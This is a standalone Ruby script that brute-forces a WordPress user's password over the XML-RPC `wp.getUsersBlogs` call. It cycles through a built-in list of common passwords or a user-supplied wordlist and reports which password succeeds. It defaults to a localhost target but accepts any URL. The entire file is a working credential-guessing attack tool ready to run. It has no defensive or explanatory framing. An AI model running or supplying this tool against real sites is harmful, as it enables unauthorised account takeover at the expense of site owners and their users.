#!/usr/bin/env ruby
# encoding: UTF-8

require 'optparse'
require 'xmlrpc/client'
require 'uri'


def wp_find_password(options)
  # https://github.com/danielmiessler/SecLists/blob/master/Passwords/Sucuri_Top_Wordpress_Passwords.txt
  passwords = %w(admin 123456 password 12345678 typhoon 666666 111111 1234567 qwerty
                 siteadmin qwerty siteadmin administrator root 123123 123321
                 1234567890 letmein123 test123 demo123 pass123 123qwe qwe123 654321 loveyou adminadmin123)

  uri = URI(options[:url])
  server = XMLRPC::Client.new(uri.host, uri.path, uri.port)
  server.http_header_extra = {'accept-encoding' => 'identity'}
  
  if options[:wordlist] != 'default'
    passwords = File.readlines(options[:wordlist])
    passwords.collect! {|s| s.chomp}
  end
  
  passwords.each do |password|
    begin
      response = server.call("wp.getUsersBlogs", options[:username], password)
      if response
        puts "--- Success: PASSWORD: #{password} for username: #{options[:username]} ---\n"
        break;
      end
    rescue XMLRPC::FaultException => e
      puts "Wrong password: #{password} for username: #{options[:username]}, response code #{e.faultCode}\n"
    end
  end
end

options = {:url => 'http://127.0.0.1:8080/wordpress/xmlrpc.php', :username => 'admin', :wordlist => 'default'}

OptionParser.new do |opts|
  opts.banner = "Usage: wp_find_password.rb [options]"
  opts.on('--username username', 'Username, default: admin') do |username|
    options[:username] = username
  end

  opts.on('--url url', 'Url, default: http://127.0.0.1/wordpress/xmlrpc.php') do |url|
    options[:url] = url
  end

  opts.on('--wordlist wordlist', 'Word List, default: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Sucuri_Top_Wordpress_Passwords.txt') do |wordlist|
    options[:wordlist] = wordlist
  end

  opts.on('-h', '--help', 'Displays Help') do
    puts opts
    exit
  end
end.parse!

wp_find_password(options)

